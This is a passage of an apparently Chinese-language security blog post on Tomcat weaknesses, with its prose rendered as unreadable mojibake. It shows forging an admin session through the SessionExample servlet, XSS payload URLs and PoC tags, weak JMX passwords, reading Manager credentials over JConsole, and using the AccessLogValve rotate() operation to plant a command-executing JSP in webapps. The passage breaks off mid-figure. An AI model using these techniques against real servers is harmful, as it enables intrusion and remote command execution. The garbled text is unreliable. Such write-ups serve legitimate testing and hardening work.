<p>index.jsp :æ„æ€å°±æ˜¯å½“loginçš„sessionä¸ºadminæ—¶å€™ä¸ºç™»å½•å¦åˆ™è·³è½¬åˆ°login.jsp<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line"><span class="comment">//åˆ¤æ–­session</span></span><br><span class="line"><span class="keyword">if</span>(session.getAttribute(<span class="string">"login"</span>) != <span class="keyword">null</span> &amp;&amp; ((String)session.getAttribute(<span class="string">"login"</span>)).equals(<span class="string">"admin"</span>))&#123; </span><br><span class="line">        out.println(<span class="string">"Login"</span>); </span><br><span class="line">      &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">       response.sendRedirect(<span class="string">"login.jsp"</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p>
<p><em>æ¼”ç¤ºå¦‚ä½•é€šè¿‡æ“çºµsessionè¿›å…¥ç½‘ç«™åå°</em></p>
<p>(1)æˆ‘ä»¬ç›´æ¥æ‰“å¼€ç½‘ç«™åå°å³index.jsp,å‘ç°è¢«é‡å®šå‘åˆ°login.jspäº†ï¼Œè€Œä¸”åœ¨ä¸çŸ¥é“å¯†ç çš„å‰æä¸‹ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•ç™»é™†è¿›å»çš„<br><a href="http://127.0.0.1:8080/examples/index.jsp" target="_blank" rel="noopener">http://127.0.0.1:8080/examples/index.jsp</a><br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910103109.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910103109.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>(2)æ‰“å¼€SessionExample : <code>http://127.0.0.1:8080/examples/servlets/servlet/SessionExample</code><br>åœ¨Name of Session Attribute: é‡Œè¾“å…¥login<br>åœ¨Value of Session Attribute:é‡Œè¾“å…¥admin<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910103327.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910103327.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>(3)æäº¤åæ˜¾ç¤ºlogin=adminå·²ç»å†™å…¥session<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910103341.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910103341.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>å†æ¬¡æ‰“å¼€index.jspï¼Œæ˜¾ç¤ºæˆåŠŸç™»å½•<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%setAttribute(<span class="string">"request.getParameter("</span>u<span class="string">")"</span>, <span class="string">" request.getParameter("</span>a<span class="string">")%&gt;</span></span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910103441.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910103441.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p><br></p>
<h4 id="0x04-Tomcatæ ·ä¾‹ç›®å½•XXSæ¼æ´"><a href="#0x04-Tomcatæ ·ä¾‹ç›®å½•XXSæ¼æ´" class="headerlink" title="0x04 Tomcatæ ·ä¾‹ç›®å½•XXSæ¼æ´"></a>0x04 Tomcatæ ·ä¾‹ç›®å½•XXSæ¼æ´</h4><p>æè¿°ï¼šApache Software Foundation Tomcatè·¨ç«™è„šæœ¬æ”»å‡»æ¼æ´<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.cq.cn:8080/jsp-examples/jsp2/el/functions.jsp?foo=[XSSplayload]</span><br><span class="line">http://www.cq.cn:8080/jsp-examples/jsp2/el/implicit-objects.jsp?foo=[XSSplayload]</span><br><span class="line">http://www.cq.cn:8080/jsp-examples/cal/cal2.jsp?time=[XSSplayload]</span><br><span class="line">http://host:port/jsp-examples/snp/snoop.jsp; &lt;SCRIPT&gt;alert()&lt;/SCRIPT&gt; test.jsp</span><br></pre></td></tr></table></figure></p>
<p><em>XSS POC:</em><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">"http://www.cqczkj.gov.cn/images/flink1.png"</span>&gt;</span><br><span class="line">&lt;a href=<span class="string">"#"</span> alt=<span class="string">"baidu"</span> onclick=alert(window.location.host)&gt;<span class="built_in">test</span>&lt;/a&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"button"</span> value=<span class="string">"xss"</span> onclick=<span class="string">"alert(1)"</span>/&gt;</span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910103559.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910103559.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<h4 id="0x05-Tomcat-JMXæœåŠ¡å™¨å¼±å£ä»¤"><a href="#0x05-Tomcat-JMXæœåŠ¡å™¨å¼±å£ä»¤" class="headerlink" title="0x05 Tomcat JMXæœåŠ¡å™¨å¼±å£ä»¤"></a>0x05 Tomcat JMXæœåŠ¡å™¨å¼±å£ä»¤</h4><p>TomcatæœåŠ¡å™¨çš„ä¸€äº›é…ç½®é—®é¢˜ï¼Œå¯ä»¥å°†Javaç®¡ç†æ‰©å±•ï¼ˆJMXï¼‰æœåŠ¡æš´éœ²åˆ°å¤–éƒ¨ç½‘ç»œä¸­ï¼Œæ¥ç”¨äºè¿œç¨‹ç›‘è§†å’Œç®¡ç†çš„ç›®çš„ã€‚<br>é€šè¿‡ä½¿ç”¨Javaå¼€å‘å·¥å…·åŒ…ï¼ˆJDKï¼‰ä¸­çš„JConsoleå·¥å…·ï¼Œè¿™äº›åŠŸèƒ½å¯èƒ½è¢«æ”»å‡»è€…æ»¥ç”¨æ¥è·å¾—ç³»ç»Ÿçš„æ§åˆ¶æƒé™ã€‚</p>
<p>å®ä¾‹:é€šè¿‡Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰æ¥ä¸æœåŠ¡å™¨äº¤äº’ã€‚è¿™ä¸ªæœåŠ¡é»˜è®¤ä¸å¼€å¯ï¼Œä¸ä¹‹ç›¸åçš„æ˜¯å…¶ä»–å¸¸è§çš„<code>Javaä¼ä¸šç‰ˆçš„æœåŠ¡å™¨ï¼ˆæ¯”å¦‚JBossï¼‰æ˜¯é»˜è®¤é…ç½®å¼€å¯çš„</code>ã€‚<br>ä¸ºäº†å¼€å¯Tomcatçš„JMXæœåŠ¡ï¼Œéœ€è¦åœ¨setenv.sh/setenv.batåšä¸€äº›ç®€å•çš„ä¿®æ”¹ï¼Œè¿™ä¸ªè„šæœ¬æ˜¯ç”¨æ¥è®¾ç½®ç¯å¢ƒå˜é‡å’ŒCatalinaè¿›ç¨‹å¯åŠ¨æ—¶çš„ä¸€äº›å±æ€§ã€‚<br>JMXæœåŠ¡å¯ä»¥é…ç½®ä¸ºæ”¯æŒè®¤è¯ï¼Œä½†æ˜¯å®ƒé»˜è®¤ä¸å¼€å¯ï¼Œå½“è®¤è¯è¢«å¼€å¯ï¼ˆæ€»æ˜¯è¢«æ¨èï¼‰ï¼Œå®ƒçš„æˆæƒæ¨¡å‹å…è®¸è®¿é—®å±äºåªè¯»æˆ–è¯»å†™è§’è‰²çš„ä¸¤ä¸ªä¸åŒçš„ç”¨æˆ·ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨ä¸‹é¢çš„URLå¯¹åº”çš„ç½‘é¡µçš„æ ‡é¢˜ä¸ºâ€œç›‘è§†å’Œç®¡ç†Tomcatâ€ï¼Œä½†æ˜¯å®ƒçš„é…ç½®æŒ‡å¯¼æ˜¯åŸºäºjava 6ç‰ˆæœ¬çš„ï¼š<br><a href="http://tomcat.apache.org/tomcat-8.0-doc/monitoring.html#Enabling_JMX_Remote" target="_blank" rel="noopener">http://tomcat.apache.org/tomcat-8.0-doc/monitoring.html#Enabling_JMX_Remote</a><br>ä¸ºäº†å¼€å¯Tomcatçš„JMXæœåŠ¡ï¼Œéœ€è¦åœ¨setenv.sh/setenv.batåšä¸€äº›ç®€å•çš„ä¿®æ”¹ï¼Œè¿™ä¸ªè„šæœ¬æ˜¯ç”¨æ¥è®¾ç½®ç¯å¢ƒå˜é‡å’ŒCatalinaè¿›ç¨‹å¯åŠ¨æ—¶çš„ä¸€äº›å±æ€§ã€‚</p>
<ul>
<li>ç¼–è¾‘Tomcat/binä¸­çš„catalina.batã€‚å¦‚æœé…ç½®æƒé™ï¼Œéœ€è¦å°†autenticateè®¾ç½®ä¸ºtrueï¼Œå°†1ä¸­çš„ä¸‹é¢ä¸¤è¡Œä»£ç æ·»åŠ åˆ°æœ€ä¸Šé¢ä¸€è¡Œï¼Œæ³¨æ„æ‰€æœ‰çš„å‘½ä»¤å¿…é¡»åœ¨ä¸€è¡Œï¼</li>
<li>åœ¨Tomcat/confç›®å½•ä¸‹æ–°å»ºä¸¤ä¸ªæ–‡ä»¶ï¼šjmxremote.accesså’Œjmxremote.password,ç¬¬ä¸€ä¸ªæ–‡ä»¶å­˜çš„æ˜¯è§’è‰²ä¿¡æ¯ï¼Œç¬¬äºŒä¸ªå­˜æ”¾çš„æ˜¯å¯†ç ä¿¡æ¯ï¼ˆå¯ä¿®æ”¹ï¼‰ã€‚</li>
</ul>
<p>å¦‚æœä½ éœ€è¦è®¤è¯ï¼Œæ·»åŠ å¹¶ä¿®æ”¹è¿™ä¸ªï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-Dcom.sun.management.jmxremote.authenticate=<span class="literal">true</span></span><br><span class="line">-Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password</span><br><span class="line">-Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access</span><br></pre></td></tr></table></figure></p>
<p>ç¼–è¾‘$CATALINA_BASE/conf/jmxremote.accessæ–‡ä»¶ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">monitorRole <span class="built_in">readonly</span> <span class="comment">#æƒé™</span></span><br><span class="line">controlRole readwrite</span><br></pre></td></tr></table></figure></p>
<p>ç¼–è¾‘$CATALINA_BASE/conf/jmxremote.passwordæ–‡ä»¶ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onitorRole tomcat     <span class="comment">#è§’è‰²åˆ†é…å¯†ç </span></span><br><span class="line">controlRole tomcat</span><br></pre></td></tr></table></figure><br>æç¤ºï¼šå¯†ç æ–‡ä»¶åº”è¯¥æ˜¯åªè¯»çš„ï¼Œåªèƒ½ç”¨å’Œè¿è¡ŒTomcatç›¸åŒçš„æ“ä½œç³»ç»Ÿç”¨æˆ·æ¥è®¿é—®ã€‚<br>å¦‚ä¸Šæ‰€è§ï¼Œjmxremote.accessæ–‡ä»¶åŒ…å«ä¸¤ä¸ªç”¨æˆ·åï¼ˆmonitorRoleå’ŒcontrolRoleï¼‰å’Œä»–ä»¬ç›¸å…³çš„è§’è‰²ã€‚åœ¨jmxremote.passwordæ–‡ä»¶ä¸­è®¾ç½®è¿™äº›ç”¨æˆ·çš„å¯†ç ã€‚</p>
<p><br></p>
<p>(1)éªŒè¯æ˜¯å¦å¯ç”¨Tomcatçš„JMXæ¥å£<br>é€šå¸¸éœ€è¦ä½¿ç”¨nmapè¿›è¡Œæ‰«æï¼Œæ¥ç¡®è®¤ä¸Tomcatå…³è”çš„JMXæ¥å£æ˜¯å¦å·²å¯åŠ¨å¹¶åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šè¿è¡Œã€‚</p>
<blockquote>
<p>nmap -p- -A -sV â€“version-all 192.168.11.128<br>â€¦<br>2001/tcp open java-rmi Java RMI Registry<br>| rmi-dumpregistry:<br>| jmxrmi<br>| implements javax.management.remote.rmi.RMIServer,<br>| extends<br>| java.lang.reflect.Proxy<br>| fields<br>| Ljava/lang/reflect/InvocationHandler; h<br>| java.rmi.server.RemoteObjectInvocationHandler<br>| @192.168.11.128:2001<br>| extends<br>|_ java.rmi.server.RemoteObject<br>â€¦<br>8009/tcp open ajp13 Apache Jserv (Protocol v1.3)<br>8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1<br>49222/tcp open rmiregistry Java RMI</p>
</blockquote>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹JMXæœåŠ¡è¢«é…ç½®ä¸º<code>åœ¨éæ ‡å‡†ç«¯å£2001/tcpè€Œä¸æ˜¯ç«¯å£1099/tcpä¸Šè¿è¡Œ</code>ï¼Œ1099/tcpé€šå¸¸è¢«è¿™ç§æœåŠ¡çš„ä¼˜å…ˆé€‰æ‹©ã€‚<br><br></p>
<p>(2)ä½¿ç”¨Jconsoleè¿æ¥jxmå·¥å…·<br>å¦‚æœä½ ä½¿ç”¨Windowsï¼ŒJConsoleæ˜¯JDKä¸­çš„ä¸€ä¸ªå°çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå­˜å‚¨åœ¨binæ–‡ä»¶å¤¹ä¸­ï¼ˆKailä¸­ä¹Ÿæœ‰ï¼‰ã€‚</p>
<blockquote>
<p>jconsole å‘½ä»¤</p>
</blockquote>
<figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910105316.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910105316.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure>
<p>è¿æ¥JXMçš„RMIæ¥å£çš„ç«¯å£IPï¼š<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910105416.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910105416.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>å•å‡»Insecure connectionæŒ‰é’®ç»§ç»­ï¼Œå½“å¯ç”¨è®¤è¯ï¼Œé€šå¸¸ä¼šæ˜¾ç¤ºä»¥ä¸‹æç¤ºï¼š<br>åœ¨è¿™ç§æƒ…å†µä¸‹æ‚¨åº”è¯¥ä½¿ç”¨usernameå’Œpasswordæ–‡æœ¬æ¡†è¾“å…¥ä¸€äº›æœ‰æ•ˆçš„å‡­æ®ï¼Œè¯·æ³¨æ„ä¹Ÿå¯èƒ½ç”±äºå…¶ä»–åŸå› è·å¾—è¿æ¥å¤±è´¥é”™è¯¯ï¼›<br>è¿æ¥å¤±è´¥çš„å¸¸è§åŸå› ä¹‹ä¸€æ˜¯ç”±äºæ”»å‡»è€…å’ŒæœåŠ¡å™¨ä¹‹é—´çš„é˜²ç«å¢™ï¼›æ­¤é˜²ç«å¢™å¯èƒ½é…ç½®ä¸ºé˜»æ­¢ä¼ å…¥æµé‡åˆ°ç”±Tomcatå¯åŠ¨çš„å…¶ä»–Java RMIè¿›ç¨‹ä½¿ç”¨çš„ç«¯å£<br>ä¾‹å¦‚ä¸Šé¢nmapæ‰«æè¾“å‡ºä¸­åˆ—å‡ºçš„49222/tcp<br><br></p>
<p>(3)ä½¿ç”¨Wireshrkeè¿›è¡Œåˆ¤æ–­ï¼š<br>åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼ŒTomcat JMXæœåŠ¡å™¨æ­£åœ¨è¿”å›åŒ…å«è®¤è¯å¤±è´¥é”™è¯¯çš„RMIæ¶ˆæ¯ï¼š<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910105524.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910105524.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>è¯·æ³¨æ„ä¸Šé¢çš„é”™è¯¯åŒ…æ‹¬éœ€è¦å‡­æ®çš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºåœ¨JConsoleåˆå§‹å±å¹•ä¸­æœªæŒ‡å®šä»»ä½•å‡­æ®ï¼›åœ¨è¾“å…¥ä¸€äº›å‡­æ®æ—¶è¿”å›ä¸åŒçš„é”™è¯¯æ¶ˆæ¯ï¼š<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910105608.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910105608.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>å¦‚æœæœªå¯ç”¨è®¤è¯ï¼ˆè¿™åœ¨æŸäº›å†…éƒ¨ç½‘ç»œæ¸—é€æµ‹è¯•ä¸­å¯èƒ½æ˜¯æ­£ç¡®çš„ï¼‰ï¼Œæˆ‘ä»¬å°†è€ƒè™‘æ”»å‡»è€…èƒ½å¤Ÿè¯†åˆ«ä¸€ä¸ªç›‘å¬çš„Tomcat JMXæ¥å£å¹¶å¯ä»¥ä½¿ç”¨JConsoleè¿æ¥åˆ°å®ƒçš„æƒ…å†µã€‚<br>è¿™æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºè®¤è¯æœªå¯ç”¨ï¼Œæˆ–è€…å› ä¸ºæ”»å‡»è€…èƒ½å¤ŸçŒœåˆ°ä¸€äº›æœ‰æ•ˆçš„å‡­æ®ã€‚<br><br></p>
<p>(4)ä½¿ç”¨JMXè¯»å–Tomcatç®¡ç†å™¨çš„å¯†ç <br>å‡è®¾Tomcatå¯ç”¨äº†ç®¡ç†å™¨åº”ç”¨ç¨‹åºï¼Œä½†æ˜¯æ²¡æœ‰ä½¿ç”¨ä»»ä½•å¼±å‡­æ®ï¼ˆå¦‚admin/adminæˆ–tomcat/managerï¼‰ã€‚<br>å‡è®¾æ”»å‡»è€…è¯•å›¾ä½¿ç”¨è‡ªåŠ¨è„šæœ¬æ¥å¼ºåˆ¶ä¸€ä¸ªæœ‰æ•ˆçš„å¯†ç è€Œä¸æˆåŠŸ,è¿™ä¸ªæ–¹æ³•æ˜¯åœ¨ä½ çš„æœºå™¨ä¸Šé¢å¯åŠ¨JConsoleå¹¶ä¸”æŒ‡å‘è¿œç¨‹çš„Tomcat JMXæœåŠ¡å™¨é€‰æ‹©MBeansé€‰é¡¹å¡</p>
<blockquote>
<p>Users-&gt;User-&gt;â€managerâ€-&gt;UserDatabase-&gt;Attributes</p>
</blockquote>
<figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910105750.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910105750.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure>
<p>è®¿é—®Tomcatç®¡ç†å™¨æ¥ç ´ç¯åº•å±‚æœåŠ¡å™¨ï¼Œæ‰§è¡Œæ­¤æ“ä½œçš„å…¸å‹æ–¹æ³•æ˜¯éƒ¨ç½²ç®€å•çš„Webåº”ç”¨ç¨‹åºå­˜æ¡£ï¼ˆWARï¼‰ï¼ŒåŒ…æ‹¬å…è®¸æ‰§è¡Œæ“ä½œç³»ç»Ÿï¼ˆOSï¼‰å‘½ä»¤çš„ä»£ç ï¼Œç„¶åè°ƒæŸ¥æœåŠ¡å™¨ä¸Šçš„å†…å®¹ã€‚<br>å¦‚æœæœåŠ¡å™¨åœ¨Windowsä¸Šè¿è¡Œï¼Œåˆ™å¤§å¤šæ•°æ—¶é—´å®ƒå°†ä½œä¸ºSYSTEMæˆ–ç®¡ç†å‘˜è¿è¡Œã€‚å› æ­¤ä½ çš„æ“ä½œç³»ç»Ÿå‘½ä»¤å°†åœ¨æœ€é«˜æƒé™çº§åˆ«è¿è¡Œã€‚<br><br></p>
<p>(5)æ—¥å¿—å¾ªç¯å‡½æ•°ä¸­çš„ç›®å½•éå†<br><em>å¦‚æœç”±äºæŸäº›åŸå› Tomcatç®¡ç†å™¨ä¸åœ¨é‚£é‡Œæ€ä¹ˆåŠï¼Ÿ</em><br>è™½ç„¶åœ¨å†…éƒ¨ç½‘ç»œä¸­éƒ¨ç½²çš„æœåŠ¡å™¨åˆ™ä¸å¯èƒ½æ˜¯è¿™ç§æƒ…å†µï¼Œä½†æ˜¯ä»ç„¶æœ‰å¯èƒ½ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¦ä¸€ç§æ–¹æ³•æ¥æµè§ˆæœåŠ¡å™¨ï¼Œå‡è®¾æˆ‘ä»¬ä»ç„¶èƒ½å¤Ÿè¿æ¥Tomcat JMXæ¥å£ã€‚<br>æ—¥å¿—å¾ªç¯å‡½æ•°:åœ¨å¤§é‡çš„å…·æœ‰å†™æƒé™çš„Tomcat JMX MBeansæ“ä½œä¸­ï¼Œæœ‰ä¸€ä¸ªæ˜¾ç¤ºäº†æœ‰è¶£çš„è¡Œä¸º<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Catalina-&gt;Valve-&gt;localhost-&gt;AccessLogValve-&gt;Operations</span><br><span class="line">boolean rotate(string newFileName)</span><br><span class="line"><span class="comment">#æœ€åtotateå‡½æ•°ç”¨æ­¤ä½ç½®æŒ‡å®šæ–‡ä»¶ï¼š</span></span><br><span class="line">/tmp/test.log</span><br></pre></td></tr></table></figure></p>
<p>è¿™è¡¨æ˜rotateå‡½æ•°ç”¨äºå¤‡ä»½Tomcatè®¿é—®æ—¥å¿—åˆ°æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ä¸­ã€‚<br>å®Œæˆè¿™ä¸ªè¿‡ç¨‹åï¼Œä¸‹é¢çš„ç¡®è®¤æ¶ˆæ¯ç”±æœåŠ¡å™¨è¿”å›ï¼š<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910105949.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910105949.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>å¯ä»¥ç¡®è®¤test.logæ–‡ä»¶åœ¨tmpç›®å½•ä¸­,ç›´åˆ°rotateå‡½æ•°è¢«è°ƒç”¨ç›®å½•çš„å†…å®¹æ˜¯Tomcatè®¿é—®æ—¥å¿—ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitnami@ubuntu:/tmp$ cat /tmp/test.log</span><br><span class="line">  192.168.11.1 - - [08/Dec/2016:14:50:42 +0000] <span class="string">"GET /test-log-request HTTP/1.1"</span> 404 1026</span><br></pre></td></tr></table></figure></p>
<p>åœ¨æœåŠ¡å™¨ä¸Šé¢æ‰§è¡ŒOSå‘½ä»¤<br>æ­£å¦‚ä¸Šä¸€èŠ‚è®¨è®ºçš„ï¼Œrotateå‡½æ•°å…è®¸åœ¨æœåŠ¡å™¨çš„ä»»æ„ç›®å½•ä¸­å­˜å‚¨æ–‡ä»¶ï¼Œå®ƒè¿˜å°†å…è®¸é€‰æ‹©è¯¥æ–‡ä»¶çš„ä»»æ„æ‰©å±•ã€‚<br>ä½œä¸ºä¸€ä¸ªæ”»å‡»è€…ï¼Œæˆ‘ä»¬æ»¥ç”¨å®ƒæ¥åœ¨Tomcatæä¾›ç½‘ç»œæœåŠ¡çš„ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªJava Servlet Pageï¼ˆJSPï¼‰æ–‡ä»¶ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬çš„ç›®æ ‡åˆ›å»ºåŒ…å«JSPæŒ‡ä»¤çš„æ–‡ä»¶æ¥åœ¨æœåŠ¡å™¨ä¸Šé¢æ‰§è¡Œå‘½ä»¤ã€‚<br>ä¸ºäº†å®ç°è¿™ä¸ªï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦çš„æ˜¯ä½¿ç”¨åœ¨URLä¸­åŒ…å«æœ‰æ•ˆçš„JSPä»£ç çš„è¯·æ±‚æ¥ç ´ç¯Tomcatè®¿é—®æ—¥å¿—ã€‚</p>
<p>ä¾‹å¦‚ï¼Œä½¿ç”¨Burp Suite Repeateræ¥å‘é€ä¸‹é¢çš„è¯·æ±‚<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910110120.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910110120.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>æ‰¾åˆ°ä¸€ä¸ªå¯é çš„è·¯å¾„æ¥å­˜æ”¾æˆ‘ä»¬çš„ä½¿ç”¨rotateå‡½æ•°çš„JSPæ–‡ä»¶ï¼Œèƒ½åˆ©ç”¨JConsoleç•Œé¢ä¸­çš„ä¸€äº›ä¿¡æ¯ï¼›VMçš„Summaryé€‰é¡¹å¡èƒ½æä¾›ä¸€äº›å…³äºcatalina.baseå±æ€§çš„ä¿¡æ¯ã€‚<br>è¿™ä¸ªé€‰é¡¹å¡åŒ…å«ä¸€ä¸ªèŠ‚ï¼ˆåœ¨çª—å£åº•éƒ¨ï¼‰ï¼Œæ˜¾ç¤ºäº†Java VMçš„å‚æ•°ã€‚<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910110131.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910110131.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>Catalina.baseç›®å½•åº”è¯¥è¿”å›ä¸€ä¸ªwebappsæ–‡ä»¶å¤¹ï¼Œå…¶ä¸­æ˜¯Tomcatæä¾›çš„å„ç§ç½‘ç»œæœåŠ¡ã€‚<br>ä¸‹é¢çš„æˆªå›¾æ˜¯TomcatæœåŠ¡å™¨é»˜è®¤çš„åº”ç”¨çš„ä¾‹å­ï¼š<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910110208.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910110208.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>å°†cataline.baseç›®å½•çš„ä¿¡æ¯å’ŒTomcatä¸Šçš„åº”ç”¨åˆ—è¡¨æ”¾åœ¨ä¸€èµ·ï¼Œæ‰¾åˆ°å­˜å‚¨æˆ‘ä»¬JSPæ–‡ä»¶çš„ç›®å½•è¿˜æ˜¯å¯èƒ½çš„ï¼›<br>ä¾‹å¦‚:ä¸€ä¸ªtest.jspæ–‡ä»¶å­˜å‚¨åœ¨/docsæ–‡ä»¶å¤¹ä¸­,åœ¨è¿™é‡Œä¸Šé¢çš„è·¯å¾„å¯ä»¥å’Œrotateå‡½æ•°ä¸€èµ·ä½¿ç”¨<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/bitnami/apache-tomcat/webapps/docs/test.jsp</span><br></pre></td></tr></table></figure><br><figure class="image-box">
